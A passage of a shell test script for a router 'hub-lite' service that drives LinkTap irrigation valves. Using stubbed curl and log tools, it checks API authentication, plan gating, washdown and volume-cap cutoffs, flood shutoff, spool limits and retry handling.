printf '%s %s\n' "$url" "$body" >> "$SHIM_LOG"
rc=$(cat "$SHIM_RC" 2>/dev/null || echo 0)
[ "$rc" = "0" ] || exit "$rc"
case "$body" in
  *'"cmd":16'*) reply='{"vol_unit":"L"}' ;;
  *'"cmd":3'*) reply=$(cat "$SHIM_CMD3" 2>/dev/null) ;;
  *) reply='{"ret":0}' ;;
esac
if [ -n "$out" ]; then printf '%s' "$reply" > "$out"; else printf '%s' "$reply"; fi
[ -n "$fmt" ] && printf '200'
exit 0
SHIM
cat > "$T/bin/logread" <<'SHIM'
#!/bin/sh
echo "Sat Sep 13 brvg-hub-lite: management key stored"
echo "Sat Sep 13 brvg-hub-lite: send failed url=https://w/api/hub-lite?vid=v&t=tok_SECRET_0123456789&x=1"
echo "Sat Sep 13 brvg-hub-lite: key is 0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
echo "Sat Sep 13 dnsmasq: unrelated"
SHIM
cat > "$T/bin/ip" <<'SHIM'
#!/bin/sh
echo "    inet 192.168.8.1/24 brd 192.168.8.255 scope global br-lan"
SHIM
chmod +x "$T/bin/curl" "$T/bin/logread" "$T/bin/ip"
SHIM_LOG="$T/curl.log"; SHIM_RC="$T/curl.rc"; SHIM_CMD3="$T/cmd3"
export SHIM_LOG SHIM_RC SHIM_CMD3

KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
DEV=aaaabbbbccccdddd
write_conf() {
  cat > "$T/conf" <<CONF
VID="v_test"
DEVICE_ID="brv_net_test"
DEVICE_TOKEN="tok_SECRET_0123456789"
WORKER_URL="https://api.example.test"
MGMT_KEY=$KEY
LINKTAP_HOST=192.168.8.50
LINKTAP_GW_ID=GW02
LINKTAP_DEV_IDS=$DEV
LINKTAP_ALLOWED=1
LINKTAP_NORMAL_VOL_L=378
CONF
}
write_conf
# One CGI call. $1 method, $2 PATH_INFO, $3 body, then extra VAR=value environment.
api() {
  _m="$1"; _p="$2"; _b="$3"; shift 3
  printf '%s' "$_b" | env PATH="$T/bin:$PATH" REQUEST_METHOD="$_m" PATH_INFO="$_p" CONTENT_LENGTH="${#_b}" \
    HTTP_AUTHORIZATION="Bearer $KEY" BRVG_HUB_LITE_CONF="$T/conf" BRVG_HUB_LITE_BIN="$HL_DIR/brvg-hub-lite.sh" \
    BRVG_LT_STATE_DIR="$T/lt" BRVG_RELAY_SPOOL="$T/spool" BRVG_HUB_LITE_STARTED="$T/started" \
    BRVG_HUB_LITE_RELOAD="$T/reload" BRVG_HUB_LITE_UPDATE="$T/update" BRVG_REPORT_CGI="$HL_DIR/hub-lite-cgi.sh" \
    BRVG_MEMBER_KEYS="$T/keys" BRVG_MEMBER_KEYS_STALE="$T/keys-stale" \
    REMOTE_ADDR="${REMOTE:-192.168.8.20}" "$@" sh "$HL_DIR/hub-lite-api.sh" 2>/dev/null
}
status_of() { printf '%s' "$1" | sed -n 's/^Status: \([0-9]*\).*/\1/p' | head -1; }
body_of() { printf '%s' "$1" | tr -d '\r' | sed '1,/^$/d'; }
date +%s > "$T/started"

echo ""
echo "# --- slice 1: the door is real and safe --------------------------------------------------"
r=$(api GET /ping "")
check "ping: version is read from HUB_LITE_VERSION (B3), not '0'" "1" "$(body_of "$r" | grep -c "\"version\":\"$HUB_LITE_VERSION\"")"
check "ping: registered reads VID + the token (B2), not VEHICLE_ID" "1" "$(body_of "$r" | grep -c '"registered":true')"
check "ping: still admits it is a lite hub" "1" "$(body_of "$r" | grep -c '"lite":true')"
check "ping: a claimed router is never adoptable" "1" "$(body_of "$r" | grep -c '"adoptable":false')"
r=$(api GET /status "")
check "status: requires nothing but the router's MGMT_KEY (B1) and answers" "200" "$(status_of "$r")"
check "status: vid comes from VID (B2)" "1" "$(body_of "$r" | grep -c '"vid":"v_test"')"
check "status: hubId is DEVICE_ID" "1" "$(body_of "$r" | grep -c '"hubId":"brv_net_test"')"
check "status: linktap claimed with the plan's permission and a gateway" "1" "$(body_of "$r" | grep -c '"capabilities":\["linktap"')"
check "status: the daemon's always-present arrays are present" "1" "$(body_of "$r" | grep -c '"routers":\[\],"sensors":\[\]')"
check "status: no secret ingest armed without SHELLY_SECRET" "1" "$(body_of "$r" | grep -c '"shellyIngestArmed":false')"
check "status: a GL-MT300N-V2 with no modem port does not claim modem_at" "0" "$(body_of "$r" | grep -c 'modem_at')"
check "status: anchor_local (D5) is claimed — the collector always runs it" "1" "$(body_of "$r" | grep -c '"anchor_local"')"
r=$(api GET /status "" HTTP_AUTHORIZATION="Bearer wrong")
check "status: a wrong key is 401" "401" "$(status_of "$r")"
check "status: and the Status line carries its reason phrase (uhttpd ignores a bare code)" "1" "$(printf '%s' "$r" | grep -c '^Status: 401 Unauthorized')"
sed '/^MGMT_KEY=/d' "$T/conf" > "$T/conf.nokey"
r=$(api GET /linktap/state "" BRVG_HUB_LITE_CONF="$T/conf.nokey")
check "state: 503 while the router has no MGMT_KEY yet" "503" "$(status_of "$r")"
r=$(api GET /linktap/state "" HTTP_AUTHORIZATION="")
check "state: 401 without a Bearer (valve state is not public on the LAN — B6)" "401" "$(status_of "$r")"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}" HTTP_AUTHORIZATION="")
check "valve: 401 without a Bearer" "401" "$(status_of "$r")"
r=$(api POST /nope "")
check "api: an unknown verb is a real 404" "404" "$(status_of "$r")"

# 🔴 B5, THE WATER-SAFETY ONE. A washdown opened through the door must be seen by the poll as the SAME
# run: never adopted, never volume-cut, however much water the meter reports.
: > "$SHIM_LOG"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"mode\":\"washdown\",\"durationSecs\":7200,\"resumeNormal\":true}")
check "B5: the washdown open is accepted" "200" "$(status_of "$r")"
check "B5: the run record lands in the collector's state dir, not /tmp/<dev>" "yes" "$([ -f "$T/lt/$DEV" ] && echo yes || echo no)"
check "B5: it records THIS run — washdown, time-only, ours, told to resume" "washdown 0 hub 1" \
  "$(. "$T/lt/$DEV"; echo "$mode $cap $prov $resume")"
check "B5: a washdown start carries NO volume_limit to the gateway" "0" "$(grep '"cmd":6' "$SHIM_LOG" | grep -c volume_limit)"
check "B5: the door rang the poll loop" "yes" "$([ -f "$T/lt/wake" ] && echo yes || echo no)"
(
  LT_STATE_DIR="$T/lt"; BRVG_RELAY_SPOOL="$T/spool"; CONF="$T/conf"
  # shellcheck disable=SC1090
  . "$T/conf"
  PATH="$T/bin:$PATH"
  unset -f curl 2>/dev/null
  printf '{"dev_stat":[{"dev_id":"%s","is_watering":1,"volume":500,"remain_duration":7000,"speed":20}]}' "$DEV" > "$SHIM_CMD3"
  : > "$SHIM_LOG"
  linktap_tick
  echo "cut=$(grep -c '"cmd":7' "$SHIM_LOG")" > "$T/b5"
  . "$T/lt/$DEV"
  echo "run=$mode/$prov/$cap/$stop" >> "$T/b5"
)
check "B5: 500 L past a 378 L profile cap — the poll issues NO stop on the washdown" "cut=0" "$(sed -n 1p "$T/b5")"
check "B5: and the run is still the washdown we opened, not an adopted Normal Run" "run=washdown/hub/0/" "$(sed -n 2p "$T/b5")"
check "B5: the measurement names it as ours" "1" "$(grep -c "prov=hub" "$T/lt/meas.$DEV")"

# The sibling hole: a Normal Run opened WITHOUT volumeCapL used to be tracked as cap 0 — no cutoff.
rm -f "$T/lt/$DEV"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"durationSecs\":3600}")
check "normal open without volumeCapL tracks the PROFILE cap, never 0" "normal 378 hub" "$(. "$T/lt/$DEV"; echo "$mode $cap $prov")"
(
  LT_STATE_DIR="$T/lt"; BRVG_RELAY_SPOOL="$T/spool"; CONF="$T/conf"; . "$T/conf"; PATH="$T/bin:$PATH"
  printf '{"is_watering":1,"volume":400}' > "$SHIM_CMD3"; : > "$SHIM_LOG"
  linktap_tick
  echo "$(grep -c '"cmd":7' "$SHIM_LOG") $(. "$T/lt/$DEV"; echo "$stop")" > "$T/cut"
)
check "normal open: the software cutoff then fires at the cap" "1 volume_cap" "$(cat "$T/cut")"

# The plan gate: opens need the cloud's permission; closes never do.
sed 's/^LINKTAP_ALLOWED=1/LINKTAP_ALLOWED=0/' "$T/conf" > "$T/conf.noplan"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"durationSecs\":60,\"volumeCapL\":10}" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "plan gate: an open on an unpermitted plan is 402" "402" "$(status_of "$r")"
# ⚠️ FIRST, THE REFUSAL, because the cutoff close issued by the poll above is still in flight: a press
# arriving while a close is being retried must NOT put a second cmd 7 on the wire for one valve, and the
# FLOOD/volume cause must keep the slot (a failed cutoff close must never be reported as a failed press).
: > "$SHIM_LOG"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "close: a press while a close is in flight is answered, and sends nothing" "200 0" \
  "$(status_of "$r") $(grep -c '\"cmd\":7' "$SHIM_LOG")"
check "close: …and the volume_cap close keeps the valve's one slot" "volume_cap" "$(. "$T/lt/close.$DEV"; echo "$CL_CAUSE")"
# Now as if that close had been confirmed (the poll removes the record), so the press is the first one.
rm -f "$T/lt/close.$DEV"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"close\"}" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "plan gate: a CLOSE is never refused for the plan" "200" "$(status_of "$r")"
check "close: marks the running cycle stop=manual, keeping its identity" "manual normal" "$(. "$T/lt/$DEV"; echo "$stop $mode")"
check "close: and it is WATCHED — confirmed against the valve, not against the gateway's ack" "manual 1" \
  "$(. "$T/lt/close.$DEV"; echo "$CL_CAUSE $CL_TRIES")"
r=$(api GET /status "" BRVG_HUB_LITE_CONF="$T/conf.noplan")
check "plan gate: no linktap capability without permission" "0" "$(body_of "$r" | grep -c '"linktap"')"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\",\"mode\":\"washdown\",\"durationSecs\":60,\"volumeCapL\":10}")
check "valve: washdown + volumeCapL is refused, like the daemon" "422" "$(status_of "$r")"
r=$(api POST /linktap/valve '{"devId":"ffffeeeeddddcccc","action":"close"}')
check "valve: an unconfigured valve is 404" "404" "$(status_of "$r")"
r=$(api POST /linktap/valve "{\"devId\":\"$DEV\",\"action\":\"open\"}")
check "valve: an open with no duration is 422" "422" "$(status_of "$r")"

r=$(api GET /linktap/state "")
check "state: serves the collector's real measurement" "1" "$(body_of "$r" | grep -c "\"devId\":\"$DEV\",\"watering\":\"1\"")"
check "state: rev is the collector's revision counter" "1" "$(body_of "$r" | grep -c '"rev":[1-9]')"
rm -f "$T/lt/meas.$DEV"
r=$(api GET /linktap/state "")
check "state: a valve with no measurement yet is OMITTED, not invented as closed" "1" "$(body_of "$r" | grep -c '"valves":\[\]')"

echo ""
echo "# --- slice 1: spool bound, drain decoupled, classification --------------------------------"
printf '1\ts1\ttemp.measurement\tv=1\n2\ts2\tflood.alarm\t\n3\ts1\ttemp.measurement\tv=2\n4\tb1\tbutton.push\t\n5\ts1\ttemp.measurement\tv=3\n' > "$T/sp"
spool_cap "$T/sp" 3
check "spool cap: bounded to the limit" "3" "$(wc -l < "$T/sp" | tr -d ' ')"
check "spool cap: the OLDEST READINGS go first; alarms survive" "flood.alarm button.push temp.measurement" "$(cut -f3 "$T/sp" | tr '\n' ' ' | sed 's/ $//')"
check "spool cap: the newest reading is the one kept" "v=3" "$(grep temp "$T/sp" | cut -f4)"
printf '1\ta\tflood.alarm\t\n2\tb\tleak.alarm\t\n3\tc\tsmoke.alarm\t\n' > "$T/sp"
spool_cap "$T/sp" 2
check "spool cap: with nothing but alarms, the oldest alarm goes" "leak.alarm smoke.alarm" "$(cut -f3 "$T/sp" | tr '\n' ' ' | sed 's/ $//')"
check "classify: 200 sent" "sent" "$(classify_http 200)"
check "classify: 503 retry" "retry" "$(classify_http 503)"
check "classify: 429 retry" "retry" "$(classify_http 429)"
check "classify: no HTTP answer at all is a retry" "retry" "$(classify_http 000)"
check "classify: 401 is a refusal resending cannot fix" "refused" "$(classify_http 401)"

# drain_relay with a stubbed worker: a refusal drops, an outage keeps, a success applies the gate.
(
  RELAY_SPOOL="$T/rs"; RELAY_SEQ_FILE="$T/rs.seq"; RELAY_STATE_DIR="$T/rs.state"; RELAY_BOOT_FILE="$T/rs.boot"
  CONF="$T/conf.drain"; cp "$T/conf" "$CONF"; LT_STATE_DIR="$T/lt"
  VID=v; DEVICE_ID=d; DEVICE_TOKEN=tok; WORKER_URL=https://w; LINKTAP_ALLOWED=0
  curl() { _o=""; _p=""; for _a in "$@"; do [ "$_p" = "-o" ] && _o="$_a"; _p="$_a"; done
           printf '%s' "$DRAIN_BODY" > "$_o"; printf '%s' "$DRAIN_CODE"; }
  printf '1\tlt_x\tlinktap.measurement\twatering=0\n' > "$RELAY_SPOOL"
  DRAIN_CODE=503; DRAIN_BODY=''; drain_relay
  echo "503:$([ -s "$RELAY_SPOOL.sending" ] && echo kept || echo gone)" > "$T/drain"
  DRAIN_CODE=401; drain_relay
  echo "401:$([ -s "$RELAY_SPOOL.sending" ] && echo kept || echo gone)" >> "$T/drain"
  printf '1\tlt_x\tlinktap.measurement\twatering=0\n' > "$RELAY_SPOOL"
  DRAIN_CODE=200; DRAIN_BODY='{"status":"ok","linktap":{"allowed":true,"profiles":{"aaaabbbbccccdddd":{"volumeCapL":50}}}}'
  drain_relay
  echo "200:$([ -s "$RELAY_SPOOL.sending" ] && echo kept || echo gone):$LINKTAP_ALLOWED:$(grep -c '^LINKTAP_ALLOWED="1"' "$CONF"):$(cat "$LT_STATE_DIR/profile.aaaabbbbccccdddd")" >> "$T/drain"
)
check "drain: an outage (503) keeps the batch for retry" "503:kept" "$(sed -n 1p "$T/drain")"
check "drain: a refusal (401) drops it instead of wedging the spool forever" "401:gone" "$(sed -n 2p "$T/drain")"
check "drain: success clears it, adopts the plan gate and persists it, and applies the REAL-shape profiles" \
  "200:gone:1:1:P_VOL=50" "$(sed -n 3p "$T/drain")"

REAL='{"status":"ok","stored":1,"linktap":{"allowed":true,"profiles":{"aaaabbbbccccdddd":{"durationSecs":7200,"volumeCapL":250.5,"autoRestart":true}}}}'
check "profiles: the worker's REAL order (allowed first) parses — it never did" \
  "aaaabbbbccccdddd 7200 250.5 1" "$(printf '%s' "$REAL" | lt_parse_profiles)"
check "allowed: true" "1" "$(printf '%s' "$REAL" | lt_parse_allowed)"
check "allowed: false" "0" "$(printf '{"linktap":{"allowed":false}}' | lt_parse_allowed)"
check "allowed: a reply with no blob says NOTHING (never a revocation)" "" "$(printf '{"status":"ok"}' | lt_parse_allowed)"
check "allowed: an 'allowed' nested in a profile is not the vehicle's permission" "0" \
  "$(printf '{"linktap":{"profiles":{"a":{"allowed":true}},"allowed":false}}' | lt_parse_allowed)"
check "allowed: profiles first, allowed after, still found" "1" \
  "$(printf '{"linktap":{"profiles":{"a":{"volumeCapL":1}},"allowed":true}}' | lt_parse_allowed)"

# The receiver's own ceiling and secret handling.
cgi() {
  env PATH="$T/bin:$PATH" QUERY_STRING="$1" BRVG_HUB_LITE_CONF="$2" BRVG_RELAY_SPOOL="$T/cgispool" \
    BRVG_HUB_LITE_BIN="$HL_DIR/brvg-hub-lite.sh" sh "$HL_DIR/hub-lite-cgi.sh" >/dev/null 2>&1
}
: > "$T/cgispool"
cp "$T/conf" "$T/conf.sec"; echo 'SHELLY_SECRET="s3cr3t"' >> "$T/conf.sec"
cgi "device=s1&event=temp.measurement&k=s3cr3t&vid=v_test&tC=20" "$T/conf.sec"
check "receiver: k and vid are routing, never spooled as telemetry" "tC=20" "$(cut -f4 "$T/cgispool")"
: > "$T/cgispool"
cgi "device=s1&event=temp.measurement&k=wrong&tC=20" "$T/conf.sec"
check "receiver: a PRESENTED wrong secret is refused" "0" "$(wc -c < "$T/cgispool" | tr -d ' ')"
cgi "device=s1&event=temp.measurement&tC=20" "$T/conf.sec"
check "receiver: an un-keyed relay-contract report is still accepted (relay sensors carry no k)" "1" "$(wc -l < "$T/cgispool" | tr -d ' ')"
i=0; while [ $i -lt 600 ]; do printf '1\ts\tx.measurement\t\n' >> "$T/cgispool"; i=$((i + 1)); done
cgi "device=s1&event=temp.measurement&tC=21" "$T/conf.sec"
check "receiver: past the hard ceiling a READING is dropped" "0" "$(grep -c 'tC=21' "$T/cgispool")"
echo 7 > "$SHIM_RC"   # the direct send fails, so the alarm is spooled
cgi "device=s1&event=flood.cable_unplugged" "$T/conf.sec"
echo 0 > "$SHIM_RC"
check "receiver: an alarm-class line is never dropped by the ceiling" "1" "$(grep -c 'cable_unplugged' "$T/cgispool")"

echo ""
echo "# --- slice 2: LinkTap parity (ported from daemon cycle.rs / linktap_runtime.rs tests) -------"
flood_case "SENSOR FAULT: flood.cable_unplugged must NOT close" "flood.cable_unplugged" no
flood_case "sensor fault: flood.cable_disconnected" "flood.cable_disconnected" no
flood_case "sensor fault: flood.fault" "flood.fault" no
flood_case "sensor fault: flood.error" "flood.error" no
flood_case "sensor fault: flood.low_battery" "flood.low_battery" no
flood_case "sensor fault: flood.mute" "flood.mute" no
flood_case "sensor fault: flood.unmute" "flood.unmute" no
flood_case "sensor fault: leak.sensor_offline" "leak.sensor_offline" no
flood_case "real Shelly: flood" "flood" yes
flood_case "real Shelly: Flood Detected" "Flood Detected" yes
flood_case "real Shelly: shelly.flood" "shelly.flood" yes
flood_case "real Shelly: water_leak" "water_leak" yes
flood_case "real Shelly: smoke.alarm" "smoke.alarm" yes
flood_case "gateway offline never closes the valve it cannot reach" "linktap.gateway.offline" no
flood_case "gateway online never closes a valve" "linktap.gateway.online" no

NOW=1787140800
hand() { if lt_should_hand_over "$@"; then echo yes; else echo no; fi; }
check "handover: 200 s left is not the time" "no" "$(hand washdown 1 hub "" 0 200 $NOW 300 $((NOW + 100)))"
check "handover: inside the 20 s lead, valve still open" "yes" "$(hand washdown 1 hub "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: exactly once" "no" "$(hand washdown 1 hub "" 0 8 $NOW 300 $((NOW + 292)) 20 | sed 's/.*/no/'; )"
check "handover: already issued never re-issues" "no" "$(hand washdown 1 hub "" 1 8 $NOW 300 $((NOW + 292)))"
check "handover: a washdown being STOPPED (flood) never hands over" "no" "$(hand washdown 1 hub flood_shutoff 0 15 $NOW 300 $((NOW + 285)))"
check "handover: not asked to resume, not done" "no" "$(hand washdown 0 hub "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: an ADOPTED run carries no intent of ours" "no" "$(hand washdown 1 adopted "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: a Normal Run never hands over" "no" "$(hand normal 1 hub "" 0 15 $NOW 300 $((NOW + 285)))"
check "handover: no remain from the gateway falls back to our own clock" "yes" "$(hand washdown 1 hub "" 0 - $NOW 300 $((NOW + 285)))"
res() { if lt_should_resume "$@"; then echo yes; else echo no; fi; }
check "resume: a washdown told to resume reopens on its timer" "yes" "$(res washdown timer 1)"
for _r in flood_shutoff manual volume_cap unknown; do
  check "resume: $_r must NOT reopen the valve" "no" "$(res washdown "$_r" 1)"
done
check "resume: not asked for, not done" "no" "$(res washdown timer 0)"
check "resume: a Normal Run cannot carry the intent" "no" "$(res normal timer 1)"

mkdir -p "$T/ph"
(
  LT_STATE_DIR="$T/ph"
  echo "idle:$(lt_poll_hint $NOW)" > "$T/hint"
  lt_write_state "$T/ph/$DEV" watering $NOW "" washdown 300 0 hub 1 0
  echo "180:$(lt_poll_hint $((NOW + 100)))" >> "$T/hint"
  echo "5:$(lt_poll_hint $((NOW + 299)))" >> "$T/hint"
  lt_write_state "$T/ph/$DEV" watering $NOW "" washdown 300 0 hub 0 0
  echo "plain:$(lt_poll_hint $((NOW + 100)))" >> "$T/hint"
)
check "poll hint: an idle valve asks for nothing" "idle:" "$(sed -n 1p "$T/hint")"
check "poll hint: 300 s run, 100 s in, 20 s lead -> look again in 180 s" "180:180" "$(sed -n 2p "$T/hint")"
check "poll hint: never busier than every 5 s" "5:5" "$(sed -n 3p "$T/hint")"
check "poll hint: a washdown with no resume is not time-critical" "plain:" "$(sed -n 4p "$T/hint")"

MIN=60
check "gw watch: the first good poll is not news" "0 0 none 0" "$(lt_gw_watch_step "" 0 1 0)"
check "gw watch: a flap inside the window says nothing" "0 0 none 0" "$(lt_gw_watch_step 0 0 0 20)"
check "gw watch: a recovery nobody was told about stays silent" "40 0 none 0" "$(lt_gw_watch_step 0 0 1 40)"
check "gw watch: 29 min silent is still a flap" "0 0 none 0" "$(lt_gw_watch_step 0 0 0 $((29 * MIN)))"
check "gw watch: 31 min silent reports offline ONCE with the duration" "0 1 offline 31" "$(lt_gw_watch_step 0 0 0 $((31 * MIN)))"
check "gw watch: and never again for the same episode" "0 1 none 0" "$(lt_gw_watch_step 0 1 0 $((45 * MIN)))"
check "gw watch: a reported outage reports its recovery" "3600 0 online 60" "$(lt_gw_watch_step 0 1 1 $((60 * MIN)))"
check "gw watch: booting next to a dead gateway starts the clock at the first poll" "1 0 none 0" "$(lt_gw_watch_step "" 0 0 1)"
check "gw watch: the grace window is the owner's thirty minutes" "1800" "$LT_GATEWAY_GRACE_SECS"

check "push: dev_stat shape" "$DEV" "$(printf '{"gw_id":"G","dev_stat":[{"dev_id":"%s","is_watering":1}]}' "$DEV" | lt_parse_push)"
check "push: bare shape, long ids normalise to 16" "$DEV" "$(printf '{"dev_id":"%s0042","is_watering":0}' "$DEV" | lt_parse_push)"
check "push: junk yields nothing" "" "$(printf 'not json' | lt_parse_push)"
check "push: empty object yields nothing" "" "$(printf '{}' | lt_parse_push)"

out=$(printf '{"is_watering":1,"vol":3.2,"speed":5.5,"battery":93,"signal":69,"is_rf_linked":true}' | lt_parse_fields)
check "fields: battery, signal and rf — what the app read off the gateway" "&meters=0&battery=93&signal=69&rf=1" "$out"
out=$(printf '{"is_watering":0,"volume":1,"is_broken":true,"is_leak":false,"is_clog":true,"is_cutoff":false}' | lt_parse_fields)
check "fields: the fault flags the app raises alarms from" "&meters=1&broken=1&leak=0&clog=1&cutoff=0" "$out"
out=$(printf '{"is_watering":0}' | lt_parse_fields)
check "fields: a gateway that omits them does not get invented zeros" "&meters=0" "$out"
check "fields: is_flm_plugin is authoritative" "&meters=1" "$(printf '{"is_flm_plugin":true}' | lt_parse_fields)"

out=$(lt_measurement_params 1 3.2 "" 5.5 "" 1 normal 86400 1135.6 212 hub)
check "measurement: a hub run reports ITS targets and who started it" \
  "watering=1&vol_l=3.20&flow_lpm=5.50&mode=normal&dur_s=86400&cap_l=1135.60&remain_s=212&prov=hub" "$out"
out=$(lt_measurement_params 1 1 "" 5.5 "" 1 washdown 7200 0 - hub)
check "measurement: a washdown is bounded by TIME only (cap_l 0.00), no remain when unknown" \
  "watering=1&vol_l=1.00&flow_lpm=5.50&mode=washdown&dur_s=7200&cap_l=0.00&prov=hub" "$out"
out=$(lt_measurement_params 0 0 "" 0 "&day=2026-09-13&day_vol_l=4.00" 0 normal 1 1 - hub)
check "measurement: an idle valve reports no targets and no flow at all" "watering=0&vol_l=0.00&day=2026-09-13&day_vol_l=4.00" "$out"
check "measurement: watering with no flow reading reports 0.00, not silence" "watering=1&vol_l=2.00&flow_lpm=0.00" \
  "$(lt_measurement_params 1 2 "" 0 "" 0 normal 1 1 - hub)"

check "start body: a washdown omits volume_limit (daemon build_start)" '{"cmd":6,"gw_id":"GW02","dev_id":"aaaabbbbccccdddd","duration":7200}' \
  "$(lt_start_body GW02 aaaabbbbccccdddd 7200 "")"

# The machine end to end, through linktap_tick and a stubbed gateway.
tick() {  # $1 cmd3 reply, $2 plan permission (default 1); one tick in a subshell against $T/lt2
  # (The permission is an ARGUMENT, not `VAR=x tick`: a POSIX shell may keep an assignment that
  # prefixes a function call, and it did — leaking into every later tick and the stripped re-run.)
  printf '%s' "$1" > "$SHIM_CMD3"; : > "$SHIM_LOG"
  ( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; CONF="$T/conf"; . "$T/conf"; PATH="$T/bin:$PATH"
    LINKTAP_ALLOWED="${2:-1}"; linktap_tick )
}
mkdir -p "$T/lt2"; : > "$T/spool2"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 1 )) "" normal 86400 1135.6 hub 0 0
tick '{"is_watering":1,"volume":3.2,"remain_duration":212,"speed":5.5}'
check "tick: a run the hub opened is its own, not adopted" "hub 86400" "$(. "$T/lt2/$DEV"; echo "$prov $dur")"
rm -f "$T/lt2/$DEV"
tick '{"is_watering":1,"volume":3.2,"remain_duration":212}'
check "tick: an already-running valve IS adopted, bounded by what the gateway says" "adopted 212 378" "$(. "$T/lt2/$DEV"; echo "$prov $dur $cap")"
check "tick: and its measurement says adopted" "1" "$(grep -c 'prov=adopted&*' "$T/lt2/meas.$DEV")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 285 )) "" washdown 300 0 hub 1 0
tick '{"is_watering":1,"volume":8,"remain_duration":15}'
check "tick: the washdown HANDS OVER inside its lead window — cmd 6 on the open valve" "1" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: ...into the valve's PROFILE Normal Run" "1" "$(grep '"cmd":6' "$SHIM_LOG" | grep -c '"duration":86400')"
check "tick: ...recorded as ours, so the next poll does not adopt it" "normal hub 0" "$(. "$T/lt2/$DEV"; echo "$mode $prov $handover")"
lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 285 )) "" washdown 300 0 hub 1 0
tick '{"is_watering":1,"volume":8,"remain_duration":15}' 0
check "tick: the handover is an OPEN, so it is plan-gated" "0" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: and says so" "1" "$(grep -c 'linktap.reopen_failed.*plan_not_permitted' "$T/spool2")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 300 )) "" washdown 300 0 hub 1 1
tick '{"is_watering":0,"volume":9}'
check "tick: a washdown told to resume that ran out on its timer reopens" "1" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: the cycle end carries its mode, like the daemon's" "1" "$(grep -c 'linktap.cycle.change.*mode=washdown&reason=timer' "$T/spool2")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" washdown 300 0 hub 1 0
( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; . "$T/conf"; PATH="$T/bin:$PATH"; linktap_flood_close )
check "flood close: marks the run it stops as flood_shutoff" "flood_shutoff" "$(. "$T/lt2/$DEV"; echo "$stop")"
tick '{"is_watering":0,"volume":3}'
check "tick: a washdown STOPPED BY A FLOOD never reopens the valve" "0" "$(grep -c '"cmd":6' "$SHIM_LOG")"
check "tick: and its end classifies as flood_shutoff, not unknown" "1" "$(grep -c 'reason=flood_shutoff' "$T/spool2")"

lt_write_state "$T/lt2/$DEV" watering $(( $(date +%s) - 60 )) "" normal 86400 10 hub 0 0
printf '{"is_watering":1,"volume":20}' > "$SHIM_CMD3"; : > "$SHIM_LOG"
( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; . "$T/conf"; PATH="$T/bin:$PATH"; LINKTAP_ALLOWED=1
  curl() { case "$*" in *'"cmd":7'*) return 7 ;; *) command curl "$@" ;; esac; }
  linktap_tick )
# 🔴 THE MARK NOW STAYS, AND THAT IS THE CHANGE. It used to be taken back after a single failed packet,
# because `lt_decide` never cuts a run that carries a stop — so one lost packet left the only volume
# enforcement there is off for the rest of the run. Un-marking bought the cap back by throwing the run's
# classification away, and did nothing at all about the case that actually bites: a command the gateway
# ACCEPTS and never delivers. The claim below owns the re-issue now, on a bounded schedule, and
# `lt_close_abandon` releases the mark at the END of it (capped runs only) if the valve never shuts.
check "tick: a cutoff STOP that fails keeps its mark and is WATCHED, not silently re-cut" "volume_cap volume_cap 1" \
  "$(. "$T/lt2/$DEV"; echo "$stop") $(. "$T/lt2/close.$DEV"; echo "$CL_CAUSE $CL_TRIES")"
check "tick: and the failure is reported" "1" "$(grep -c 'linktap.stop_failed&*.*gateway_unreachable$' "$T/spool2")"
rm -f "$T/lt2/$DEV"
echo 7 > "$SHIM_RC"
tick '{}'
check "tick: an unreachable gateway starts the reachability clock" "yes" "$([ -s "$T/lt2/gw.watch" ] && echo yes || echo no)"
echo 0 > "$SHIM_RC"
( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; . "$T/conf"; PATH="$T/bin:$PATH"; echo 22 > "$SHIM_RC"
  printf '1 0\n' > "$T/lt2/gw.watch"; rm -f "$T/lt2/$DEV"; linktap_flood_close; echo 0 > "$SHIM_RC" )
check "flood close: a close the gateway did not take spools stop_failed with cause=flood" "1" "$(grep -c 'linktap.stop_failed.*cause=flood' "$T/spool2")"

# --- CONFIRM-THEN-RETRY, through the real tick and driver ----------------------------------------
#
# 🔴 THE CASE: the gateway ACCEPTS the `cmd 7` (the shim answers `{"ret":0}`) and the valve keeps
# reporting `is_watering:1`. Before this, every tier logged that as a successful close and told nobody.
# The schedule here is SCALED — retries due at once, give up after a second — so the give-up boundary is
# reachable without waiting five real minutes; the production numbers are pinned by the pure checks
# above and by close_watch.rs's own suite.
drive() {  # one lt_drive_closes pass against $T/lt2. $1 = give-up seconds (default 1), $2 = alert-at (default 0).
  # ⚠️ TWO WINDOWS SINCE THE OWNER'S SPLIT. The alert defaults to 0 — "tell him on the first pass"
  # — so a test that only wants to exercise re-issuing still produces the alert exactly where production
  # would, at the start of the sequence rather than at its end.
  ( LT_STATE_DIR="$T/lt2"; BRVG_RELAY_SPOOL="$T/spool2"; CONF="$T/conf"; . "$T/conf"; PATH="$T/bin:$PATH"
